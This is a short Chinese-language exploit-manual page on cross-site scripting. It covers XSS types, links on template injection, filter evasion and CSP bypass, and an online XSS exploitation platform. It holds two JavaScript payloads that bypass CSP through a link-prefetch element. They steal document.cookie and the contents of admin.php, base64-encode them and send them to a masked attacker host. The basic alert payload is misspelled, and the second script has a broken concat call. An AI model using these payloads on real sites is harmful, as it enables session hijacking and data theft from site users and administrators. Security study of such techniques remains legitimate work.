# EXP手册-Cross-site scripting
## 基础知识
XSS攻击可以分为3类：存储型（持久型）、反射型（非持久型）、基于DOM。  
```
<scrpit>alert('XSS')</script>   
```
### 0x01 Client-Side Template Injection实现XSS攻击
- [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
关键词：客户端模板注入、AngularJS
## Bypass
### 0x02 Bypass Filter
- XSS online利用平台：https://xsspt.com/
- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
### 0x03 Bypass CSP
同源：协议、域名、端口相同。    
- CSP online检测工具：https://csp-evaluator.withgoogle.com/

- [同源策略详解及绕过方法](http://zjw.dropsec.xyz/CTF/2016/12/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%AF%A6%E8%A7%A3%E5%8F%8A%E7%BB%95%E8%BF%87-%E8%BD%AC.html)

利用```<link>```绕过CSP，发送cookie
```
<script>
$.get("admin.php", function(data){
  var content = window.btoa(document.cookie).concat(window.btoa(data));
  var n0t = document.createElement("link");
  n0t.setAttribute("rel", "prefetch");
  n0t.setAttribute("href", "http://***/".concat(content));
  document.head.appendChild(n0t);
});
</script>
```
在上述基础上访问其他页面
```
<script>
getText = function(url, callback) 
{
    var request = new XMLHttpRequest();
    request.onreadystatechange = function()
    {
        if (request.readyState == 4 && request.status == 200)
        {
            callback(request.responseText); 
        }
    }; 
    request.open("GET", url);
    request.send();
}
function mycallback(data) {
  var content =concat(window.btoa(data));
  var n0t = document.createElement("link");
  n0t.setAttribute("rel", "prefetch");
  n0t.setAttribute("href", "http://*****/".concat(content));
  document.head.appendChild(n0t);
}
getText("admin.php", mycallback); 
</script>

```
## Reference
- [AMP HTML 关于XSS的CTF WRITE UP](https://xz.aliyun.com/t/2347)
AMP获取cookies的方法
